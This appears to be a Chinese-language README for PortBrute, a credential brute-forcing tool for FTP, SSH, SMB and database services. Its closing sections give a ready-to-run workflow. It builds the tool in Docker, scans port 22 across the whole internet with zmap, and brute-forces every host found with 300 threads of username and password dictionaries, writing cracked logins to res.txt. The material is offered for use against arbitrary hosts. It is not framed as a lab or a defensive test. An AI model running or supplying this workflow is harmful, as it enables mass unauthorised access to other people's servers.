### 介绍

> 一款跨平台小巧的端口爆破工具，支持爆破FTP/SSH/SMB/MSSQL/MYSQL/POSTGRESQL/MONGOD。 

### 使用说明

> ​	ip.txt中放入需要爆破的ip+端口，比如 `10.10.10.10:3306`。  如果不是标准端口，比如3307是MYSQL。写成 `10.10.10.10:3307|MYSQL`。 其他`FTP/SSH/SMB/MSSQL/MYSQL/POSTGRESQL/MONGOD`同理

> ​	Windows/MAC/Linux已经打包好了，分别对应(PortBruteWin.exe/PortBruteMac/PortBruteLinux)。无论是内网渗透，还是日常使用，直接下载下来就可以直接用。

![image](https://github.com/awake1t/PortBrute/blob/master/common/example1.png)


### 快速开始

	先把要爆破的资产放入ip.txt中，直接运行下面命令开始爆破。 结果会在当前目录生成res.txt

`PortBruteWin.exe`


### 已完成
  - [x] 支持多协议 FTP/SSH/SMB/MSSQL/MYSQL/POSTGRESQL/MONGOD
  - [x] 支持非常规端口
  - [x] 支持user:pass 字典模式 [2020-0829]
  - [x] 爆破时看到进度，增加了跑马灯 [2020-0926]

### 待完成
  - [ ] 自动根据爆破的协议去选择不同的字典,更加方便

    
### 安装
	apt update && apt install docker.io -y && git clone https://github.com/qq1521575701/PortBrute.git && cd PortBrute && docker build -t sshcrack . && docker run -itd --name sshcrack --network host sshcrack:latest && docker exec -it sshcrack /bin/bash

### 扫描
	nohup zmap -p 22 0.0.0.0/0 -N 500 -o ssh.txt > zmap.log &

### 为ip添加端口
	sed -i 's/$/:22|SSH/' ssh.txt

### 开始
	nohup ./PortBruteLinux -f ssh.txt -p pass.txt -t 300 -u user.txt > PortBruteLinux.log &

	tail -f PortBruteLinux.log

	docker exec -it sshcrack tail -f PortBruteLinux.log
### 查看结果
	cat res.txt

	docker exec -it sshcrack cat res.txt
